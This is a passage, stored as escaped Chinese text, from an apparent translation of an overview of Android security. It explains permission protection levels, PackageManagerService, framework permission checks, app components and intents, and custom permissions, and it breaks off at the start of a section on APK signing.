\u5230\u76ee\u524d\u4e3a\u6b62\u6240\u63cf\u8ff0\u7684\u6743\u9650\u6a21\u578b\u63d0\u4f9b\u4e86\u4e00\u79cd\u5f3a\u5316\u5b89\u5168\u6027\u7684\u6709\u6548\u65b9\u6cd5\u3002 \u540c\u65f6\uff0c\u8fd9\u4e2a\u6a21\u578b\u662f\u65e0\u6548\u7684\uff0c\u56e0\u4e3a\u5b83\u8ba4\u4e3a\u6240\u6709\u7684\u6743\u9650\u662f\u76f8\u7b49\u7684\u3002 \u5728\u79fb\u52a8\u64cd\u4f5c\u7cfb\u7edf\u7684\u60c5\u51b5\u4e0b\uff0c\u6240\u63d0\u4f9b\u7684\u529f\u80fd\u5728\u5b89\u5168\u610f\u4e49\u4e0a\u5e76\u4e0d\u603b\u662f\u76f8\u7b49\u3002 \u4f8b\u5982\uff0c\u5b89\u88c5\u5e94\u7528\u7a0b\u5e8f\u7684\u529f\u80fd\u6bd4\u53d1\u9001 SMS \u7684\u529f\u80fd\u66f4\u91cd\u8981\uff0c\u76f8\u53cd\uff0c\u53d1\u9001 SMS\u7684\u529f\u80fd\u6bd4\u8bbe\u7f6e\u8b66\u544a\u6216\u632f\u52a8\u66f4\u5371\u9669\u3002 \u8fd9\u4e2a\u95ee\u9898\u5728 Android \u4e2d\u901a\u8fc7\u5f15\u5165\u6743\u9650\u7684\u5b89\u5168\u7ea7\u522b\u6765\u89e3\u51b3\u3002\u6709\u56db\u4e2a\u53ef\u80fd\u7684\u6743\u9650\u7ea7 \u522b\uff1a normal \uff0c dangerous \uff0c signature \u548c signatureOrSystem \u3002\u6743\u9650\u7ea7\u522b\u8981\u4e48\u786c\u7f16\u7801\u5230 Android \u64cd\u4f5c\u7cfb\u7edf\uff08\u5bf9\u4e8e\u7cfb\u7edf\u6743\u9650\uff09\uff0c\u8981\u4e48\u7531\u81ea\u5b9a\u4e49\u6743\u9650\u58f0\u660e\u4e2d\u7684\u7b2c\u4e09\u65b9\u5e94\u7528\u7a0b\u5e8f\u7684\u5f00\u53d1\u8005\u5206 \u914d\u3002\u6b64\u7ea7\u522b\u5f71\u54cd\u662f\u5426\u51b3\u5b9a\u5411\u8bf7\u6c42\u7684\u5e94\u7528\u7a0b\u5e8f\u6388\u4e88\u6743\u9650\u3002\u4e3a\u4e86\u88ab\u6388\u4e88\u6743\u9650\uff0c\u6b63\u5e38\u7684\u6743\u9650\u53ef\u4ee5\u53ea \u5728\u5e94\u7528\u7a0b\u5e8f\u7684 AndroidManifest.xml \u6587\u4ef6\u4e2d\u8bf7\u6c42\u3002\u5371\u9669\u6743\u9650\u9664\u4e86\u5728\u6e05\u5355\u6587\u4ef6\u4e2d\u8bf7\u6c42\u4e4b\u5916\uff0c\u8fd8\u5fc5 \u987b\u7531\u7528\u6237\u6279\u51c6\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5b89\u88c5\u5e94\u7528\u7a0b\u5e8f\u671f\u95f4\uff0c\u5b89\u88c5\u5305\u6240\u8bf7\u6c42\u7684\u6743\u9650\u96c6\u4f1a\u663e\u793a\u7ed9\u7528\u6237\u3002 \u5982\u679c\u7528\u6237\u6279\u51c6\u5b83\u4eec\uff0c\u5219\u5b89\u88c5\u5e94\u7528\u7a0b\u5e8f\u3002\u5426\u5219\uff0c\u5b89\u88c5\u5c06\u88ab\u53d6\u6d88\u3002\u5982\u679c\u8bf7\u6c42\u6743\u9650\u7684\u5e94\u7528\u4e0e\u58f0\u660e\u5b83 \u7684\u5e94\u7528\u62e5\u6709\u76f8\u540c\u7b7e\u540d\uff0c\uff086.1 \u4e2d\u63d0\u5230\u4e86 Android \u4e2d\u7684\u5e94\u7528\u7a0b\u5e8f\u7b7e\u540d\u7684\u7528\u6cd5\uff09\uff0c\u7cfb\u7edf\u5c06\u6388 \u4e88 signature \u6743\u9650\u3002\u5982\u679c\u8bf7\u6c42\u7684\u6743\u9650\u5e94\u7528\u548c\u58f0\u660e\u6743\u9650\u7684\u4f7f\u7528\u76f8\u540c\u8bc1\u4e66\u7b7e\u540d\uff0c\u6216\u8bf7\u6c42\u5e94\u7528\u4f4d\u4e8e \u7cfb\u7edf\u6620\u50cf\u4e0a\uff0c\u5219\u6388\u4e88 signatureOrSystem \u6743\u9650\u3002\u56e0\u6b64\uff0c\u5bf9\u4e8e\u6211\u4eec\u7684\u793a\u4f8b\uff0c\u632f\u52a8\u529f\u80fd\u88ab\u6b63\u5e38\u7ea7\u522b \u7684\u6743\u9650\u4fdd\u62a4\uff0c\u53d1\u9001 SMS \u7684\u529f\u80fd\u88ab\u5371\u9669\u7ea7\u522b\u7684\u6743\u9650\u4fdd\u62a4\uff0c\u4ee5\u53ca\u8f6f\u4ef6\u5305\u5b89\u88c5\u529f\u80fd \u88ab signatureOrSystem \u6743\u9650\u7ea7\u522b\u4fdd\u62a4\u3002 4.2.1 \u7cfb\u7edf\u6743\u9650\u5b9a\u4e49 \u00b6 \u7528\u4e8e\u4fdd\u62a4 Android \u64cd\u4f5c\u7cfb\u7edf\u529f\u80fd\u7684\u7cfb\u7edf\u6743\u9650\u5728\u6846\u67b6\u7684 AndroidManifest.xml \u6587\u4ef6\u4e2d\u5b9a\u4e49\uff0c\u4f4d\u4e8e Android \u6e90\u7684 frameworks/base/core/res \u6587\u4ef6\u5939\u4e2d\u3002 \u8fd9\u4e2a\u6587\u4ef6\u7684\u4e00\u4e2a\u6458\u5f55\u5305\u542b\u4e00\u4e9b\u6743\u9650\u5b9a\u4e49\u7684 \u4f8b\u5b50\uff0c\u5982\u4ee3\u7801\u6e05\u5355 4.2 \u6240\u793a\u3002 \u5728\u8fd9\u4e9b\u793a\u4f8b\u4e2d\uff0c\u5c55\u793a\u4e86\u7528\u4e8e\u4fdd\u62a4\u53d1\u9001 SMS\uff0c\u632f\u52a8\u5668\u548c\u5305\u5b89\u88c5\u529f \u80fd\u7684\u6743\u9650\u58f0\u660e\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u7b2c\u4e09\u65b9\u5e94\u7528\u7a0b\u5e8f\u7684\u5f00\u53d1\u4eba\u5458\u65e0\u6cd5\u8bbf\u95ee\u53d7 signature \u548c signatureOrSystem \u7ea7\u522b\u7684 \u7cfb\u7edf\u6743\u9650\u4fdd\u62a4\u7684\u529f\u80fd\u3002 \u8fd9\u79cd\u884c\u4e3a\u4ee5\u4ee5\u4e0b\u65b9\u5f0f\u6765\u4fdd\u8bc1\uff1a\u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\u5305\u4f7f\u7528\u5e73\u53f0\u8bc1\u4e66\u7b7e\u540d\u3002 \u56e0 \u6b64\uff0c\u9700\u8981\u4f7f\u7528\u8fd9\u4e9b\u7ea7\u522b\u7684\u6743\u9650\u4fdd\u62a4\u7684\u529f\u80fd\u7684\u5e94\u7528\u7a0b\u5e8f\u5fc5\u987b\u4f7f\u7528\u76f8\u540c\u7684\u5e73\u53f0\u8bc1\u4e66\u8fdb\u884c\u7b7e\u540d\u3002 \u7136 \u800c\uff0c\u4ec5\u6709\u64cd\u4f5c\u7cfb\u7edf\u7684\u6784\u5efa\u8005\u624d\u53ef\u4ee5\u8bbf\u95ee\u8be5\u8bc1\u4e66\u7684\u79c1\u94a5\uff0c\u901a\u5e38\u662f\u786c\u4ef6\u751f\u4ea7\u8005\uff08\u4ed6\u4eec\u81ea\u5df1\u5b9a\u5236 Android\uff09\u6216\u7535\u4fe1\u8fd0\u8425\u5546\uff08\u4f7f\u7528\u5176\u4fee\u6539\u7684\u64cd\u4f5c\u7cfb\u7edf\u6620\u50cf\u6765\u5206\u53d1\u8bbe\u5907\uff09\u3002 4.2.2 \u6743\u9650\u7ba1\u7406 \u00b6 \u7cfb\u7edf\u670d\u52a1 PackageManagerService \u8d1f\u8d23 Android \u4e2d\u7684\u5e94\u7528\u7a0b\u5e8f\u7ba1\u7406\u3002 \u6b64\u670d\u52a1\u6709\u52a9\u4e8e\u5728\u64cd\u4f5c\u7cfb\u7edf \u4e2d\u5b89\u88c5\uff0c\u5378\u8f7d\u548c\u66f4\u65b0\u5e94\u7528\u7a0b\u5e8f\u3002 \u6b64\u670d\u52a1\u7684\u53e6\u4e00\u4e2a\u91cd\u8981\u4f5c\u7528\u662f\u6743\u9650\u7ba1\u7406\u3002 \u57fa\u672c\u4e0a\uff0c\u5b83\u53ef\u4ee5\u88ab\u8ba4 \u4e3a\u662f\u4e00\u4e2a\u7b56\u7565\u7ba1\u7406\u7684\u8981\u7d20\u3002 \u5b83\u5b58\u50a8\u4e86\u7528\u4e8e\u68c0\u67e5 Android \u5305\u662f\u5426\u5206\u914d\u4e86\u7279\u5b9a\u6743\u9650\u7684\u4fe1\u606f\u3002 \u6b64 \u5916\uff0c\u5728\u5e94\u7528\u7a0b\u5e8f\u5b89\u88c5\u548c\u5347\u7ea7\u671f\u95f4\uff0c\u5b83\u6267\u884c\u4e00\u5806\u68c0\u67e5\uff0c\u6765\u786e\u4fdd\u5728\u8fd9\u4e9b\u8fc7\u7a0b\u4e2d\u4e0d\u8fdd\u53cd\u6743\u9650\u6a21\u578b\u7684 \u5b8c\u6574\u6027\u3002 \u6b64\u5916\uff0c\u5b83\u8fd8\u4f5c\u4e3a\u4e00\u4e2a\u7b56\u7565\u5224\u5b9a\u7684\u8981\u7d20\u3002 \u6b64\u670d\u52a1\u7684\u65b9\u6cd5\uff08\u6211\u4eec\u5c06\u5728\u540e\u9762\u5c55\u793a\uff09\u662f\u6743\u9650 \u68c0\u67e5\u94fe\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u3002 \u6211\u4eec\u4e0d\u4f1a\u5728\u8fd9\u91cc\u8003\u8651 PackageManagerService \u7684\u64cd\u4f5c\u3002 \u7136\u800c\uff0c\u611f\u5174 \u8da3\u7684\u8bfb\u8005\u53ef\u4ee5\u53c2\u8003[15,19]\u6765\u83b7\u5f97\u5982\u4f55\u6267\u884c\u5e94\u7528\u5b89\u88c5\u7684\u66f4\u591a\u7ec6\u8282\u3002 PackageManagerService \u5c06\u6240\u6709\u7b2c\u4e09\u65b9\u5e94\u7528\u7a0b\u5e8f\u7684\u6743\u9650\u7684\u76f8\u5173\u4fe1\u606f\u5b58\u50a8 \u5728 /data/system/packages.xml [7]\u4e2d\u3002 \u8be5\u6587\u4ef6\u7528\u4f5c\u7cfb\u7edf\u91cd\u65b0\u542f\u52a8\u4e4b\u95f4\u7684\u6c38\u4e45\u5b58\u50a8\u5668\u3002 \u4f46\u662f\uff0c\u5728 \u8fd0\u884c\u65f6\uff0c\u6240\u6709\u6709\u5173\u6743\u9650\u7684\u4fe1\u606f\u90fd\u4fdd\u5b58\u5728 RAM \u4e2d\uff0c\u4ece\u800c\u63d0\u9ad8\u7cfb\u7edf\u7684\u54cd\u5e94\u901f\u5ea6\u3002 \u5728\u542f\u52a8\u671f\u95f4\uff0c \u6b64\u4fe1\u606f\u4f7f\u7528\u5b58\u50a8\u5728\u7528\u4e8e\u7b2c\u4e09\u65b9\u5e94\u7528\u7a0b\u5e8f\u7684 packages.xml \u6587\u4ef6\u4e2d\u7684\u6570\u636e\uff0c\u4ee5\u53ca\u901a\u8fc7\u89e3\u6790\u7cfb\u7edf\u5e94 \u7528\u7a0b\u5e8f\u6765\u6536\u96c6\u3002 4.2.3 Android \u6846\u67b6\u5c42\u7684\u6743\u9650\u5b9e\u65bd \u00b6 \u4e3a\u4e86\u4e86\u89e3 Android \u5982\u4f55\u5728\u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\u5c42\u5f3a\u5236\u5b9e\u65bd\u6743\u9650\uff0c\u6211\u4eec\u8003\u8651 Vibrator \u670d\u52a1\u7528\u6cd5\u3002 \u5728\u6e05 \u5355 4.3 \u7684\u7b2c 6 \u884c\u4e2d\uff0c\u5c55\u793a\u4e86\u632f\u52a8\u5668\u670d\u52a1\u5982\u4f55\u4fdd\u62a4\u5176\u65b9\u6cd5 vibrate \u7684\u793a\u4f8b\u3002 \u8fd9\u4e00\u884c\u68c0\u67e5\u4e86\u8c03\u7528 \u7ec4\u4ef6\u662f\u5426\u5206\u914d\u6709\u7531\u5e38\u91cf android.Manifest.permission.VIBRATE \u5b9a\u4e49\u7684\u6807 \u7b7e android.permission.VIBRATE \u3002 Android \u63d0\u4f9b\u4e86\u51e0\u79cd\u65b9\u6cd5\u6765\u68c0\u67e5\u53d1\u9001\u8005\uff08\u6216\u670d\u52a1\u4f7f\u7528\u8005\uff09\u662f \u5426\u5df2\u88ab\u5206\u914d\u4e86\u6743\u9650\u3002 \u5728\u6211\u4eec\u8fd9\u4e2a\u5e93\uff0c\u8fd9\u4e9b\u8bbe\u65bd\u7531\u65b9\u6cd5 checkCallingOrSelfPermission \u8868\u793a\u3002 \u9664\u4e86\u8fd9\u79cd\u65b9\u6cd5\uff0c\u8fd8\u6709\u8bb8\u591a\u5176\u4ed6\u65b9\u6cd5\u53ef\u4ee5\u7528\u4e8e\u68c0\u67e5\u670d\u52a1\u8c03\u7528\u8005\u7684\u6743\u9650\u3002 \u7b2c\u4e94\u7ae0 Android \u5e94\u7528\u5c42\u5b89\u5168 \u00b6 5.1 \u5e94\u7528\u7ec4\u4ef6 \u00b6 Android \u5e94\u7528\u4ee5 Android \u8f6f\u4ef6\u5305\uff08 .apk \uff09\u6587\u4ef6\u7684\u5f62\u5f0f\u5206\u53d1\u3002 \u4e00\u4e2a\u5305\u7531 Dalvik \u53ef\u6267\u884c\u6587\u4ef6\uff0c \u8d44\u6e90\u6587\u4ef6\uff0c\u6e05\u5355\u6587\u4ef6\u548c\u672c\u5730\u5e93\u7ec4\u6210\uff0c\u5e76\u7531\u5e94\u7528\u7684\u5f00\u53d1\u4eba\u5458\u4f7f\u7528\u81ea\u7b7e\u540d\u8bc1\u4e66\u7b7e\u540d\u3002 \u6bcf\u4e2a Android \u5e94\u7528\u7531\u56db\u4e2a\u7ec4\u4ef6\u7c7b\u578b\u7684\u51e0\u4e2a\u7ec4\u4ef6\u7ec4\u6210\uff1a\u6d3b\u52a8\uff08Activity\uff09\uff0c\u670d\u52a1\uff08Service\uff09\uff0c\u5e7f\u64ad\u63a5 \u6536\u5668\uff08Boardcast Reciver\uff09\u548c\u5185\u5bb9\u4f9b\u5e94\u5668\uff08Content Provider\uff09\u3002 \u5c06\u5e94\u7528\u5206\u79bb\u4e3a\u7ec4\u4ef6\u6709\u52a9\u4e8e \u5e94\u7528\u7684\u4e00\u90e8\u5206\u5728\u5e94\u7528\u4e4b\u95f4\u91cd\u7528\u3002 \u6d3b\u52a8\u3002 \u6d3b\u52a8\u662f\u7528\u6237\u754c\u9762\u7684\u5143\u7d20\u4e4b\u4e00\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u4e00\u4e2a\u6d3b\u52a8\u901a\u5e38\u4ee3\u8868\u4e00\u4e2a\u754c\u9762\u3002 \u670d\u52a1\u3002 \u670d\u52a1\u662f Android \u4e2d\u7684\u540e\u53f0\u5de5\u4f5c\u88c5\u7f6e\u3002 \u670d\u52a1\u53ef\u4ee5\u65e0\u9650\u671f\u8fd0\u884c\u3002 \u6700\u77e5\u540d\u7684\u670d\u52a1\u793a\u4f8b\u662f\u5728\u540e \u53f0\u64ad\u653e\u97f3\u4e50\u7684\u5a92\u4f53\u64ad\u653e\u5668\uff0c\u5373\u4f7f\u7528\u6237\u79bb\u5f00\u5df2\u542f\u52a8\u6b64\u670d\u52a1\u7684\u6d3b\u52a8\u3002 \u5e7f\u64ad\u63a5\u6536\u5668\u3002 \u5e7f\u64ad\u63a5\u6536\u5668\u662f\u5e94\u7528\u7684\u7ec4\u4ef6\uff0c\u5b83\u63a5\u6536\u5e7f\u64ad\u6d88\u606f\u5e76\u6839\u636e\u6240\u83b7\u5f97\u7684\u6d88\u606f\u542f\u52a8\u5de5\u4f5c\u6d41\u3002 \u5185\u5bb9\u4f9b\u5e94\u5668\u3002 \u5185\u5bb9\u4f9b\u5e94\u5668\u662f\u4e3a\u5e94\u7528\u63d0\u4f9b\u5b58\u50a8\u548c\u68c0\u7d22\u6570\u636e\u7684\u80fd\u529b\u7684\u7ec4\u4ef6\u3002 \u5b83\u8fd8\u53ef\u4ee5\u4e0e\u53e6\u4e00\u5e94\u7528 \u5171\u4eab\u4e00\u7ec4\u6570\u636e\u3002 \u56e0\u6b64\uff0cAndroid \u5e94\u7528\u7531\u4e0d\u540c\u7684\u7ec4\u4ef6\u7ec4\u6210\uff0c\u6ca1\u6709\u4e2d\u592e\u5165\u53e3\u70b9\uff0c\u4e0d\u50cf Java \u7a0b\u5e8f\u548c main \u65b9\u6cd5\u90a3 \u6837\u3002 \u7531\u4e8e\u6ca1\u6709\u5165\u53e3\u70b9\uff0c\u6240\u6709\u7ec4\u4ef6\uff08\u5e7f\u64ad\u63a5\u6536\u5668\u9664\u5916\uff0c\u5b83\u4e5f\u53ef\u4ee5\u52a8\u6001\u5b9a\u4e49\uff09\u9700\u8981\u7531\u5e94\u7528\u7684\u5f00\u53d1 \u4eba\u5458\u5728 AndroidManifest.xml \u6587\u4ef6\u4e2d\u58f0\u660e\u3002 \u5206\u79bb\u6210\u7ec4\u4ef6\u4f7f\u5f97\u6211\u4eec\u53ef\u4ee5\u5728\u5176\u5b83\u5e94\u7528\u4e2d\u4f7f\u7528\u7ec4\u4ef6\u3002 \u4f8b\u5982\uff0c\u5728\u6e05\u5355 5.1 \u4e2d\uff0c\u663e\u793a\u4e86\u4e00\u4e2a\u5e94\u7528\u7684 AndroidManifest.xml \u6587\u4ef6\u7684\u793a\u4f8b\u3002 \u6b64\u5e94\u7528\u5305\u542b\u7b2c 21 \u884c\u4e2d\u58f0\u660e\u7684\u4e00\u4e2a Activity \u3002\u5176\u4ed6\u5e94\u7528\u53ef\u80fd\u4f1a\u8c03\u7528\u6b64\u6d3b\u52a8\uff0c\u5c06\u6b64\u7ec4\u4ef6\u7684\u529f\u80fd\u96c6\u6210\u5230\u5176\u5e94\u7528 \u4e2d\u3002 Android \u63d0\u4f9b\u4e86\u5404\u79cd\u65b9\u5f0f\u6765\u8c03\u7528\u5e94\u7528\u7684\u7ec4\u4ef6\u3002 \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528\u65b9 \u6cd5 startActivity \u548c startActivityForResult \u542f\u52a8\u65b0\u7684\u6d3b\u52a8\u3002 \u670d\u52a1\u901a\u8fc7 startService \u65b9\u6cd5\u542f \u52a8\u3002 \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u88ab\u8c03\u7528\u7684\u670d\u52a1\u8c03\u7528\u5176\u65b9\u6cd5 onStart \u3002 \u5f53\u5f00\u53d1\u4eba\u5458\u8981\u5728\u7ec4\u4ef6\u548c\u670d\u52a1\u4e4b\u95f4\u5efa \u7acb\u8fde\u63a5\u65f6\uff0c\u5b83\u8c03\u7528 bindService \u65b9\u6cd5\uff0c\u5e76\u5728\u88ab\u8c03\u7528\u7684\u670d\u52a1\u4e2d\u8c03\u7528 onBind \u65b9\u6cd5\u3002 \u5f53\u5e94\u7528\u6216\u7cfb\u7edf \u7ec4\u4ef6\u4f7f\u7528 sendBroadcast \uff0c sendOrderedBroadcast \u548c sendStickyBroadcast \u65b9\u6cd5\u53d1\u9001\u7279\u6b8a\u6d88\u606f \u65f6\uff0c\u5c06\u542f\u52a8\u5e7f\u64ad\u63a5\u6536\u5668\u3002 \u5185\u5bb9\u4f9b\u5e94\u5668\u7531\u6765\u81ea\u5185\u5bb9\u89e3\u6790\u5668\u7684\u8bf7\u6c42\u8c03\u7528\u3002\u6240\u6709\u5176\u4ed6\u7ec4\u4ef6\u7c7b\u578b\u901a\u8fc7 Intent \uff08\u610f\u56fe\uff09\u6fc0\u6d3b\u3002 \u610f \u56fe\u662f Android \u4e2d\u57fa\u4e8e Binder \u6846\u67b6\u7684\u7279\u6b8a\u901a\u4fe1\u624b\u6bb5\u3002\u610f\u56fe\u88ab\u4f20\u9012\u7ed9\u6267\u884c\u7ec4\u4ef6\u8c03\u7528\u7684\u65b9\u6cd5\u3002\u88ab\u8c03 \u7528\u7684\u7ec4\u4ef6\u53ef\u4ee5\u88ab\u4e24\u79cd\u4e0d\u540c\u7c7b\u578b\u7684\u610f\u56fe\u8c03\u7528\u3002\u4e3a\u4e86\u663e\u793a\u8fd9\u4e9b\u7c7b\u578b\u7684\u5dee\u5f02\uff0c\u8ba9\u6211\u4eec\u8003\u8651\u4e00\u4e2a\u4f8b \u5b50\u3002\u4f8b\u5982\uff0c\u7528\u6237\u60f3\u8981\u5728\u5e94\u7528\u4e2d\u9009\u62e9\u56fe\u7247\u3002\u5e94\u7528\u7684\u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u4f7f\u7528\u663e\u5f0f\u610f\u56fe\u6216\u9690\u5f0f\u610f\u56fe\u6765\u8c03 \u7528\u9009\u62e9\u56fe\u7247\u7684\u7ec4\u4ef6\u3002\u5bf9\u4e8e\u7b2c\u4e00\u79cd\u610f\u56fe\u7c7b\u578b\uff0c\u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u5728\u4ed6\u7684\u5e94\u7528\u7684\u7ec4\u4ef6\u4e2d\u5b9e\u73b0\u6311\u9009\u529f \u80fd\uff0c\u5e76\u4f7f\u7528\u5e26\u6709\u7ec4\u4ef6\u540d\u79f0\u6570\u636e\u5b57\u6bb5\u7684\u663e\u5f0f\u610f\u56fe\u8c03\u7528\u6b64\u7ec4\u4ef6\u3002\u5f53\u7136\uff0c\u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u8c03\u7528\u5176\u4ed6\u5e94 \u7528\u7684\u7ec4\u4ef6\uff0c\u4f46\u662f\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u4ed6\u5fc5\u987b\u786e\u4fdd\u8be5\u5e94\u7528\u5b89\u88c5\u5728\u7cfb\u7edf\u4e2d\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u4ece\u5f00\u53d1\u4eba\u5458\u7684 \u89d2\u5ea6\u6765\u770b\uff0c\u4e00\u4e2a\u5e94\u7528\u4e2d\u7684\u7ec4\u4ef6\u6216\u4e0d\u540c\u5e94\u7528\u7684\u7ec4\u4ef6\u4e4b\u95f4\u7684\u4ea4\u4e92\u4e0d\u5b58\u5728\u5dee\u5f02\u3002\u5bf9\u4e8e\u7b2c\u4e8c\u79cd\u610f\u56fe\u7c7b \u578b\uff0c\u5f00\u53d1\u4eba\u5458\u5c06\u9009\u62e9\u9002\u5f53\u7ec4\u4ef6\u7684\u6743\u5229\u8f6c\u79fb\u7ed9\u64cd\u4f5c\u7cfb\u7edf\u3002 intent \u5bf9\u8c61\u5728 \u5176 Action \uff0c Data \u548c Category \u5b57\u6bb5\u4e2d\u5305\u542b\u4e00\u4e9b\u4fe1\u606f\u3002\u6839\u636e\u8fd9\u4e2a\u4fe1\u606f\uff0c\u4f7f\u7528\u610f\u56fe\u8fc7\u6ee4\u5668\uff0c\u64cd\u4f5c \u7cfb\u7edf\u9009\u62e9\u53ef\u4ee5\u5904\u7406\u610f\u56fe\u7684\u9002\u5f53\u7ec4\u4ef6\u3002\u610f\u56fe\u8fc7\u6ee4\u5668\u5b9a\u4e49\u4e86\u7ec4\u4ef6\u53ef\u4ee5\u5904\u7406\u7684\u610f\u56fe\u7684\u201c\u6a21\u677f\"\u3002\u5f53\u7136\uff0c \u76f8\u540c\u7684\u5e94\u7528\u53ef\u4ee5\u5b9a\u4e49\u4e00\u4e2a\u610f\u56fe\u8fc7\u6ee4\u5668\uff0c\u5b83\u5c06\u5904\u7406\u6765\u81ea\u5176\u4ed6\u7ec4\u4ef6\u7684\u610f\u56fe\u3002 5.2 \u5e94\u7528\u5c42\u7684\u6743\u9650 \u00b6 \u6743\u9650\u4e0d\u4ec5\u7528\u4e8e\u4fdd\u62a4\u5bf9\u7cfb\u7edf\u8d44\u6e90\u7684\u8bbf\u95ee\u3002 \u7b2c\u4e09\u65b9\u5e94\u7528\u7684\u5f00\u53d1\u4eba\u5458\u8fd8\u53ef\u4ee5\u4f7f\u7528\u81ea\u5b9a\u4e49\u6743\u9650\u6765\u4fdd\u62a4 \u5bf9\u5176\u5e94\u7528\u7684\u7ec4\u4ef6\u7684\u8bbf\u95ee\u3002 \u81ea\u5b9a\u4e49\u6743\u9650\u58f0\u660e\u7684\u793a\u4f8b\u5982\u6e05\u5355 5.1 \u4e2d\u7b2c 11 \u884c\u6240\u793a\u3002\u81ea\u5b9a\u4e49\u6743\u9650\u7684\u58f0 \u660e\u7c7b\u4f3c\u4e8e\u7cfb\u7edf\u6743\u9650\u4e4b\u4e00\u3002 \u4e3a\u4e86\u8bf4\u660e\u81ea\u5b9a\u4e49\u6743\u9650\u7684\u7528\u6cd5\uff0c\u8bf7\u53c2\u8003\u56fe 5.1\u3002\u7531 3 \u4e2a\u7ec4\u4ef6\u7ec4\u6210\u7684\u5e94\u7528 2 \u5e0c\u671b\u4fdd\u62a4\u5bf9\u5176\u4e2d\u4e24\u4e2a\u7684 \u8bbf\u95ee\uff1aC1 \u548c C2\u3002\u4e3a\u4e86\u5b9e\u73b0\u8fd9\u4e2a\u76ee\u6807\uff0c\u5e94\u7528 2 \u7684\u5f00\u53d1\u8005\u5fc5\u987b\u58f0\u660e\u4e24\u4e2a\u6743\u9650\u6807\u7b7e p1 \uff0c p2 \uff0c\u5e76 \u76f8\u5e94\u5730\u5c06\u5b83\u4eec\u5206\u914d\u7ed9\u53d7\u4fdd\u62a4\u7684\u7ec4\u4ef6\u3002\u5982\u679c\u5e94\u7528 1 \u7684\u5f00\u53d1\u8005\u60f3\u8981\u8bbf\u95ee\u5e94\u7528 2 \u7684\u7ec4\u4ef6 C1 \uff0c\u5219\u4ed6 \u5fc5\u987b\u5b9a\u4e49\u4ed6\u7684\u5e94\u7528\u9700\u8981\u6743\u9650 p1 \u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5e94\u7528 1 \u5c31\u53ef\u4ee5\u4f7f\u7528\u5e94\u7528 2 \u7684\u7ec4\u4ef6 C1\u3002\u5982\u679c \u5e94\u7528\u6ca1\u6709\u6307\u5b9a\u6240\u9700\u7684\u6743\u9650\uff0c\u5219\u7981\u6b62\u8bbf\u95ee\u53d7\u6b64\u6743\u9650\u4fdd\u62a4\u7684\u7ec4\u4ef6\uff08\u53c2\u89c1\u56fe 5.1 \u4e2d\u7ec4\u4ef6 C2 \u7684\u60c5 \u51b5\uff09\u3002\u56de\u5934\u770b\u770b\u6211\u4eec\u5728\u4ee3\u7801 5.1 \u4e2d\u7684 AndroidManifest.xml \u6587\u4ef6\u7684\u4f8b\u5b50\uff0c\u6d3b\u52a8 TestActivity \u88ab \u6743\u9650 com.testpackage.permission.mypermission \u4fdd\u62a4\uff0c\u5b83\u5728\u540c\u4e00\u4e2a\u5e94\u7528\u6e05\u5355\u6587\u4ef6\u4e2d\u58f0\u660e\u3002\u5982\u679c \u53e6\u4e00\u4e2a\u5e94\u7528\u60f3\u8981\u4f7f\u7528 TestActivity \u63d0\u4f9b\u7684\u529f\u80fd\uff0c\u5b83\u5fc5\u987b\u8bf7\u6c42\u4f7f\u7528\u6b64\u6743\u9650\uff0c\u7c7b\u4f3c\u4e8e\u7b2c 16 \u884c\u4e2d \u7684\u64cd\u4f5c\u3002 ActivityManagerService \u8d1f\u8d23\u8c03\u7528\u5e94\u7528\u7684\u7ec4\u4ef6\u3002 \u4e3a\u4e86\u4fdd\u8bc1\u5e94\u7528\u7ec4\u4ef6\u7684\u5b89\u5168\u6027\uff0c\u5728\u7528\u4e8e\u8c03\u7528\u7ec4 \u4ef6\u7684\u6846\u67b6\u65b9\u6cd5\uff08\u4f8b\u5982\uff0c5.1 \u8282\u4e2d\u63cf\u8ff0\u7684 startActivity \uff09\u4e2d\uff0c\u653e\u7f6e\u7279\u6b8a\u7684\u94a9\u5b50\u3002 \u8fd9\u4e9b\u94a9\u5b50\u68c0\u67e5 \u5e94\u7528\u662f\u5426\u6709\u6743\u8c03\u7528\u7ec4\u4ef6\u3002 \u8fd9\u4e9b\u68c0\u67e5\u4ee5 PackageManagerServer \u7c7b\u7684 CheckUidPermission \u65b9\u6cd5\u7ed3 \u675f\uff08\u53c2\u89c1\u6e05\u5355 4.6\uff09\u3002 \u56e0\u6b64\uff0c\u53d1\u751f\u5728 Android \u6846\u67b6\u5c42\u7684\u5b9e\u9645\u7684\u6743\u9650\u5b9e\u65bd\uff0c\u53ef\u4ee5\u770b\u505a Android \u64cd\u4f5c\u7cfb\u7edf\u7684\u53d7\u4fe1\u4efb\u90e8\u5206\u3002 \u56e0\u6b64\uff0c\u5e94\u7528\u4e0d\u80fd\u7ed5\u8fc7\u68c0\u67e5\u3002 \u6709\u5173\u5982\u4f55\u8c03\u7528\u7ec4\u4ef6\u548c\u6743\u9650\u68c0\u67e5\u7684\u66f4\u591a\u4fe1 \u606f\uff0c\u8bf7\u53c2\u89c1[8] \u7b2c\u516d\u7ae0 Android \u5b89\u5168\u7684\u5176\u5b83\u8bdd\u9898 \u00b6 6.1 Android \u7b7e\u540d\u8fc7\u7a0b \u00b6 Android \u5e94\u7528\u7a0b\u5e8f\u4ee5 Android \u5e94\u7528\u5305\u6587\u4ef6\uff08 .apk \u6587\u4ef6\uff09\u7684\u5f62\u5f0f\u5206\u53d1\u5230\u8bbe\u5907\u4e0a\u3002 \u7531\u4e8e\u8fd9\u4e2a\u5e73\u53f0 \u7684\u7a0b\u5e8f\u4e3b\u8981\u662f\u7528 Java \u7f16\u5199\u7684\uff0c\u6240\u4ee5\u8fd9\u79cd\u683c\u5f0f\u4e0e Java \u5305\u7684\u683c\u5f0f -- jar \uff08Java 